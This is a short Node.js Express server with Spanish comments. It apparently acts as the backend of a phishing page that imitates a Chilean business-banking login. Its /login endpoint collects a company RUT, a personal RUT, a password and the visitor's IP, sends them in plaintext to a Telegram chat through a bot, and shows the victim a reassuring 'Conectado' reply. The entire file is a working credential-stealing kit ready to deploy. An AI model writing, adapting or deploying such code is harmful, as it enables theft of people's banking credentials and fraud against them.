const express = require("express");
const cors = require("cors");
const path = require("path");
// Si tu Node es <18, instala node-fetch y descomenta:
// const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Variables de entorno en Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Función para enviar mensajes a Telegram
async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });
  if (!res.ok) {
    throw new Error(`Telegram API error: ${res.statusText}`);
  }
}

// Endpoint de login → recibe RUT Empresa, RUT Persona y Clave
app.post("/login", async (req, res) => {
  const { rutEmpresa, rutPersona, passwd } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const mensaje = `🔔 Nuevo intento de login:\n🏢 RUT Empresa: ${rutEmpresa || "(sin empresa)"}\n👤 RUT Persona: ${rutPersona || "(sin persona)"}\n🔑 Clave: ${passwd || "(sin clave)"}\n🌐 IP: ${ip}`;

  try {
    await sendTelegramMessage(mensaje);
    res.json({ status: "Conectado", mensaje: "✅ Hemos recibido tu solicitud." });
  } catch (error) {
    console.error("Error enviando a Telegram:", error);
    res.status(500).json({ status: "error", mensaje: "❌ Error al notificar." });
  }
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Render usa PORT de entorno
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
